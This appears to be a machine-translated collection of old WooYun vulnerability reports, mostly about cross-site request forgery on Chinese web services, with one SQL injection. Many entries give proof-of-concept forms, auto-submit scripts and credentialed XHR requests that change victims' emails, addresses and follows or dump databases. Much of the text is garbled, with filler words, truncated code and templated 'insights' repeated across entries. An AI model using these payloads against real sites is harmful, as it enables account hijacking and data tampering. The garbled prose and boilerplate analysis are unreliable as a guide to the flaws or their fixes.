### [wooyun-2015-0162515] pointIlinkIthencancanwillentertexta certain video siteaccount
**Vendor**: a certain video site | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain video sitebinda certain social platformlog inrequestashttps://example.com/[redacted]

**POC**: textrecorded videohttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addcsrfprotectiona certain social platformbindtextusea certain social platformusernamedpasswordlog in
---

---
### [wooyun-2015-093070] FineCMStranslated textcsrfvulnerabilityadmin backendaddmanagement+arbitrarytranslated text
**Vendor**: dayrui.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textonecmscsrfvulnerability,notexttokenvalidation

**POC**: 1,admin backend,administrator,add2,capture packetstruncationnovalidation3,constructform4,translated text,texthasonetext,insidetextcanaddmodifyhtmlfiletruncationoneunder,look attextiscancsrftranslated text!translated text

**Bypass**: Direct exploitation

**Fix**: addvalidation
---

---
### [wooyun-2013-021181] a certain textplatformapiseveraltextissue
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: as shown,textusersinglesendinformationlocation,textusetoken,causingcsrf.https://example.com/[redacted]

**POC**: sendtextonefriendtexttestscreenshot:

**Bypass**: Direct exploitation

**Fix**: 1,token2,requesttextrestriction
---

---
### [wooyun-2014-077655] DouPHPcanCSRFdatabase dump
**Vendor**: douco.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inwww\admin\backup.php:if ($rec == 'backup') {$fileid = isset($_REQUEST['fileid']) ? $_REQUEST['fileid'] : 1;$tables = $_REQUEST['tables'];$vol_size = $_REQUEST['vol_size'];$totalsize = $_REQUEST['totalsize'];$file_name = $_REQUEST['file_name'];  //1,userinputfileasbackupfilenamed// textbackupfilenamedwhethertextif (!$check->is_backup_file($file_name . '.sql'))  //2,is_backup_file textcheckwhetheristextnumbertranslated text,.sqltext$dou->dou_msg($_LANG['backup_file

**POC**: <html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><body><form name="csrf" action="http://[IP redacted] method="post"><input type="hidden" name="chkall" value="check"><input type="hidden" name="tables[]" value="dou_admin"><input type="hidden" name="tabl

**Bypass**: Direct exploitation

**Fix**: csrfvulnerabilityexploit
---

---
### [wooyun-2015-0111863] a certain search enginetextCSRFone issue(translated textfortextpermissionsaccount)
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textopenoneIhastextpermissionstext,capture packetschecklook atmodifywilltextnamednamedatapacketas shownthenfoundisthis waytexthttps://example.com/[redacted] id="form1" name="form1" method="post" action="https://example.com/[redacted]"><p>textnamednamekw:<input type="text" name="kw" id="kw" /></p><p>willtextnamednamembr_alias:<input type="text" name="mbr_alias" i

**POC**: Iinbacktrackthistestoneunder.foundcansuccessintextthroughformsubmitmodify.as shownbeforetextwilltextnamednameisBTtextintextgoodformthensubmit,returnjsondata,textcodeas0,texta certain search enginetext,0allissuccess.thenagaincomebacktracklook atoneundertextbemodify

**Bypass**: Direct exploitation

**Fix**: addtexttbs,orvalidationsourcetextcan.
---

---
### [wooyun-2015-0120762] foundcsrfone issuecantranslated textusertranslated textemail
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: intranslated textonetestuseaccountsoufunpa6164textistextcsrf   thenoninformationmodifytranslated text-----------------textaftertextonemailbindthata certain emailservicetext--------------------thenontexthandlecapture packetstext  foundtexttoken-------------------------thattextthentextonewebpagetranslated textisselftestthennotthattranslated text textonepointthenok-----------------------------------textgood  thattextthenthistestIthentext peoplebrowsercreate peopleaccountgoodthentextItranslated textwebpage  resulthastext  clicktranslated text   one issuecsrftotext

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2012-05028] a certain social platforma certain social platformauto-follow
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: putselfwebsitesendtexttoa certain social platform userclickaftercantextfollowa certain user

**POC**: <form action="https://example.com/[redacted]" method="post" id="f"><input name="uids" value="1237949364,2143550005"></form><script>document.getElementById('f').submit();</script>

**Bypass**: Direct exploitation

**Fix**: 1.addsourcerestriction2.textisnotisajaxrequest
---

---
### [wooyun-2015-0158328] a certain search enginea certain sitehasSQL injectionvulnerabilityROOT permissions
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: SQL injectionvulnerability

**Meta-thinking**: Trigger signal: functional testing

**Insight**: SQL injectionvulnerability lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify SQL injectionvulnerability-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] (POST)except_label_ids=&YII_CSRF_TOKEN=

**POC**: ---Parameter: except_label_ids (POST)Type: boolean-based blindTitle: OR boolean-based blind - WHERE or HAVING clausePayload: except_label_ids=-1823) OR 9214=9214 AND (7202=7202&YII_CSRF_TOKEN=b2a372d95b23a82c96b413253c9597a172f31e4c---web application technology: Apacheback-end DBMS: MySQL 5current u

**Bypass**: Direct exploitation

**Fix**: ~~~~
---

---
### [wooyun-2015-0105968] translated textone locationfunctional design flaw causescross-siterequest forgery(CSRF)#3
**Vendor**: huaban.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textone locationfunctional design flaw causescross-siterequest forgery(CSRF)#3

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: 1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2014-075538] translated textSKYWCMall versionsCSRF vulnerability,canexecute arbitrarySQL
**Vendor**: a certain technology company | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilitypage:/skywcm/skywcm/bat/cmd.jsptextistextnottexthereputoneExecutionSQLtotexthastranslated text,andtextentireadmin backendnotextthispagelink,Ithenhandletextasistextsendtextinputinhereonetextpage.canexecute arbitrarySQLtext,butonlywillreturn"Executionsuccess"or"Executionfailed"text,herehasCSRF vulnerabilityuseBurpSuitetextCSRF_POCsavetextHTMLfile,theninlog inskywcmadmin backendtextunderclicksubmitthattext,throughtextmethodtextskywcmaftertextdatadatabasetranslated text,allcanconstructoneaddadministratorCSRFform,insidetextisaddadministratorSQLtext,thentranslated textcanlog inadmin backenduserclick.translated text,thispageonlyneedcanlog inadmin backendthencantextquestion,notneedadministratortext,sotextispermissionstextlowuserallcaninthispageonExecutionSQLtext

**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="biz_action" value="3" /><input type="hidden" name="sql" value="select 1 from dual " /><input type="submit" value="Submit requ

**Bypass**: Direct exploitation

**Fix**: andbeforepublisharbitrary file downloadvulnerabilityonetext,nottextdirectlyputthispagetextiftexthasneed,textoneunderCSRFdefense,validationformsourceortoken
---

---
### [wooyun-2015-0116493] a certain video sitetextnamearbitrarymodify(cantextadmin)
**Vendor**: text | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: screenshotputtextnametextadmin,puta certain video sitemodifytextnameGETpackettextnext,simulationGETsubmitrequest,innicknamevalueinsidetextthenistextname,textnametext+text,thencantextchange,text:https://example.com/[redacted] admin&antiCsrf=6b6fbbcf98369ceb046c5732cfb16819&callback=window.Q.__callbacks__.cbp73e2gthenisinadmintextaddonetext,resultreturnmodifysuccess

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: servicetextremovetextortextlineafterinenterlinetranslated textnamewhetherhas
---

---
### [wooyun-2014-077635] a certain telecom operatora subsiteissue(2)textlinepermissions
**Vendor**: a certain telecom operator | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textisdirectlyontext.https://example.com/[redacted] /updateFaqAnswer.do?answerId=1762678&content=xxtextopenoneissue:checklook atsource code,texttoreplycontentanswerId,testas1762678thenonlargetext,directlymodifygetrequestanswerId,modifycontentasmodifycontent,sendtextrequest:againtextunderIE,canlook attocontentalreadybemodify:ifusetooltextunder,putallreplyallmodifytext,thatissuethenserious.

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: addpermissions.
---

---
### [wooyun-2013-037429] a certain social platformcancsrffollow/add follow
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: post: https://example.com/[redacted]"data":{"name":"translated text","cnt":4,"fcnt":1,"followRelation":1},"status":0,"statusText":"operationsuccess"}

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: look atyoutranslated text
---

---
### [wooyun-2015-0155306] translated textmain sitemultiple locationscsrf
**Vendor**: a certain textcompany | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,websitemultiple locationshascsrfvulnerability,textmodifypersonalinformation,modifyshipping addressetc.location,texthas,thislocationusemodifyshipping addressenterlinetext: modifymobile phoneaddress,capture packetstext:canlook attopostcontentinnonotcantextParameters,trycsrf,constructmaliciouslink,textcode is as follows:xmlhttp.open("POST", "https://example.com/[redacted]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("province=460000000000&city=460100000000&district=460105000000&town=460105002000&village=460105002002&set_defaul

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtexttoken
---

---
### [wooyun-2015-0131371] translated texthascsrfcantextmodifytextshipping address
**Vendor**: gaitu.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textmodifyshipping addresslocationhascsrf. modifyshipping address.capture packets:nonotcantextParameters,textrequestpacket,constructcsrflink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("contactid=142623&ajaxType=6&contacter=woo126&provinceid=5&citiid=25&districtid=328&address=hteshteshp&postcode=010000&tel=13111111111&phone01

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2013-046399] a certain social platformCSRFpackage
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated texta certain video sitetexttoa certain portal sitelook atvideo,thatthencometextissue.notlook atdo not know,onelook attextonetext,a certain social platformalreadyputtranslated text?onetokentextlook atto!!textarbitraryone locationallhasCSRF,textforisa certain social platform,textlocationtexttypetestunder.0x01followCSRF:https://example.com/[redacted] name="test" action="https://example.com/[redacted]" method="POST"><br>content<input type="text" name="cont

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: addtoken,text,nottextputtranslated text!
---

---
### [wooyun-2015-0101050] csdnappearcsrfvulnerability
**Vendor**: CSDNdevelopercommunity | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: CSDNthroughGETmethodtextusersendtranslated text,requestURLtextas:https://example.com/[redacted] src="https://example.com/[redacted]" />thentranslated textlog incsdnusertextquestionmaliciouswebsite,textcansuccesssendtranslated text

**POC**: maliciouswebsitecode:requestafterstatus:csdnontextinformation:

**Bypass**: Direct exploitation

**Fix**: Referer Check;useToken;
---

---
### [wooyun-2015-0157003] translated textlinetextcsrf+translated text
**Vendor**: translated textlinetext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thistexthascsrf ,texthastranslated text,translated texttwo peopletestaccountontexttestaccounthas,andtranslated texthas,throughcapture packetsfoundmodifyprofileistextquestionas followsthisaddress,https://example.com/[redacted]

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: csrf =>token   translated textshouldtext
---

---
### [wooyun-2016-0167813] onetranslated textCSRFmodifyother people's information
**Vendor**: a certain texttechnology company | **Year**: 2016 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: POST /homecp/user/dosetting HTTP/1.1Host: i.emao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://example.com/[redacted] 77Cookie: Hm_l

**POC**: POST /homecp/user/dosetting HTTP/1.1Host: i.emao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Request

**Bypass**: Direct exploitation

**Fix**: thisyoutextItranslated text.
---

---
### [wooyun-2013-021729] a certain social platforma certain social platforma certain functionalitycontrolnottextcancausingworm
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1)hasissuefunctionalityin:lady.weibo.comcommentlocation;2)clickpublishandcapture packets,getas followsdata;POST /cmnt/submit HTTP/1.1Host: comment5.news.sina.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-085699] a certain communicationsVendora certain websitehasCSRF vulnerability
**Vendor**: a certain communications equipment vendor | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain translated text www.ztemall.com ,submittextrequesttextnotokentext,hasCSRF vulnerability

**POC**: 1.textontextpersonalinheartinsidetextpersonalinformation,modifypassword,hastranslated textetc.texthasCSRFissue,textothertranslated texthasissue2.texthastranslated textcomeexample:3.capture packetsfoundnodefensecsrftoken:4.constructtextsubmitcsrf POC:<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="translated textnamed" value="WooYu

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2014-079888] translated textcsrfarbitrarydeleteuserpublishtextproduct
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] postsubmitidcanarbitrarymodify,deleteuserpublishtextproduct.returntext500,pageinsidealreadydeletethisproduct,textinisoperationafteralreadydeleteresultotheradd,modifytextshouldtexthascsrf,text,translated textvalidation.

**POC**: pageinsidealreadydeletethisproduct,textinisoperationafteralreadydeleteresult

**Bypass**: Direct exploitation

**Fix**: addtokenvalidation
---

---
### [wooyun-2015-0133292] largetexthascsrfvulnerabilityendangers account security
**Vendor**: datebao.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyemail,notvalidationtextemail,directlytextemailsendtextmessagesendtextemailurlhttps://example.com/[redacted]"GET", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded,charset=UTF-8");xmlhttp.send();emailtextselfthengooduserintextlog intextunder,clicktextpageafter,willtextspecifiedemailsendtextmodifyemailemailaccountA,emailclickconstruct

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2015-0127577] translated textCSRF vulnerabilitycausingpersonalinformationbetext
**Vendor**: zhunbai.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] accounttotext textunderIhasPOC<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="a certain Internet company" value="3088828541" /><input type="hidden" name="email" value="3088828541&#64;a certain Internet company&#46;com" /><input type="hidden" name="realname" value="wangbadan" /><input type="hidden" name="mobile" value="13169670911" /><input type="hidden" name="add

**POC**: canthroughemailrecoveruserpassword,translated texttomodifyuserpasswordCSRF exploitgoodiftranslated text

**Bypass**: Direct exploitation

**Fix**: textyou know what to do textnottext, textallnottextthenasthat
---

---
### [wooyun-2014-061333] a certain websitesubsitehasCSRFcantextfollow
**Vendor**: a certain portal site | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Ia certain portal site   https://example.com/[redacted]  datapacket as followstextitsin  xpt=Ymltb2xpdW5pYW5Ac29odS5jb20%3D throughURLtextcode xpt=Ymltb2xpdW5pYW5Ac29odS5jb20=,againforitsvaluebase64textcodegettextfollowtextemail xpt=bimoliunian@a certain email.com  WStextcome,isnotisItextimmediatelytexthasonelargetranslated text

**POC**: constructtextIlink:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: usePOSTrequest,addtokentext
---

---
### [wooyun-2015-0110077] translated textone locationCSRF vulnerabilityone issue
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: product has peoplefavorite,wetextpacketlook atundernovalidationtokenwetext peoplepoc

**POC**: textsuccesstranslated textfavoritethisproduct

**Bypass**: Direct exploitation

**Fix**: add avalidationthen can
---

---
### [wooyun-2013-036610] a certain search enginetexta certain functionalityCSRF vulnerabilityone location
**Vendor**: a certain search engine | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.hascancsrflink:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: do not know
---

---
### [wooyun-2013-043892] Iistranslated texta certain social platformfollowers
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textquestionhttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2015-0163282] throughcraft a POST requestcanfortextblogarticleenterlinecomment
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: <html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="from" value="oldBlog" /><input type="hidden" name="appid" value="blog" /><input type="hidden" name="discusstype" value="0" /><input type="hidden" name="content" value="aaa" /><input type="hidden" name="itemid" value="310939570" /><input type="hidden" n

**POC**: {"code":0,"msg":"savesuccess","comment":{"content":"aaa","passport":"Zmx5bml1QHNvaHUuY29t","id":505509840,"createtime":1450701667232,"unick":"123","uavatar":"https://example.com/[redacted]","ulink":"http://#######.blog.sohu.com/","topassport":"MTE1MjcxMzAyM0BxcS5jb20=","sname":"#

**Bypass**: Direct exploitation

**Fix**: validationsource
---

---
### [wooyun-2015-095033] translated textCSRFdefensetextcausingdirectlytextuserpassword
**Vendor**: baozoumanhua.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: tokentextjunk--directlyBypasstextwhenfortextaddwetextsubmit peoplenottexttokenrequestgood!look atlook atresultalreadysuccessmodify

**POC**: youtext

**Bypass**: filterBypass

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-039982] textmain sitecsrfboost followers
**Vendor**: text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textlook attotranslated textonepersonal.canlook attocanfollow/add follow..thenf12.textrequest.canlook attowetexttargetsendtextthis wayonegetrequest.singletranslated textcomelook attotextfollow.goodwetextintextoneaccounttest.directlytextquestionthisaddress.foundalreadyfollow.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-03999] 19translated textcsrf
**Vendor**: tenninetext | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] token referrercheck,issuenotonlythisone textallnottexttoken httponlytranslated text..translated text......

**POC**: no

**Bypass**: Direct exploitation

**Fix**: checkreferrer,intextanduserinformationtranslated textaddtoken
---

---
### [wooyun-2015-0130491] textetexthascsrfvulnerability
**Vendor**: textEtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyshipping address,capture packetschecklook at:itsinnonotcantextParameters,textcsrflink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("loginId=woo2&id=addr_3130650&userName=woo2&region_1=c_region_11001&region_2=c_region_11035&region_3=c_region_11380&RegionId=c_region_11380&RegionTem

**POC**: useprove

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-055473] text-a certain social platform OAuth 2.0 redirect_uri CSRF vulnerability
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text-a certain social platform OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.ifattackerrestartonetext-a certain social platform  OAuth 2.0 authenticationrequest,andinterceptOAuth 2.0 authenticationrequestreturn.https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0116130] translated textone locationcsrfcanboost followers
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: POC:<html><img src="https://example.com/[redacted]" ></html>

**Bypass**: Direct exploitation

**Fix**: validationreferer
---

---
### [wooyun-2015-0102910] textwhentranslated textnotwhencausingtext+csrf(textandtextfunctionality)
**Vendor**: www.kadang.com | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] translated text,translated textistext,nottranslated text= =translated text:textItranslated text: textItext,Itranslated textallbetranslated text:Same as aboveNo.twotext:textinsidetextnamedwebsitetextwhentranslated textlargetextuseandtextrewardtextwebsiteCEOtext: text,translated textoneissuetextinherewetextlook atundertextquestionbeforethenaddaddresstextisgetrequesttext...weconstruct:https://example.com/[redacted]

**POC**: https://example.com/[redacted] translated text,translated textistext,nottranslated text= =translated text:textItranslated text: textItext,Itranslated textallbetranslated text:Same as aboveNo.twotext:textinsidetextnamedwebsite

**Bypass**: Direct exploitation

**Fix**: 1:textadd avalidationcodetextonlyvalidationone times,2 timestranslated text2:csrfaddonetextnotjunkonetexttokenoronetextnottexthash
---

---
### [wooyun-2012-010451] a certain translated textCSRF vulnerability
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inuseQtranslated textgametextinterfacein,hasCSRFissue,URL:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: CSRFnottext
---

---
### [wooyun-2015-0120670] a certain portal siteblogcanhijackarbitrarytextaccount
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textchecklook atconfigurationfile:https://example.com/[redacted] domain="*.ifeng.com" /></cross-domain-policy>text,thenselfonetext,seemstextsecurity,nottexta certain portal sitethattexthasthreecantext.useastextnottext,nottext...uploadtextlocation,nocheckcontent,onlyistextnamedoneundertext~getmaliciousimagefile:https://example.com/[redacted]

**POC**: testhijackaddtextchain:

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-07230] RenrenCSRF vulnerability
**Vendor**: text | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

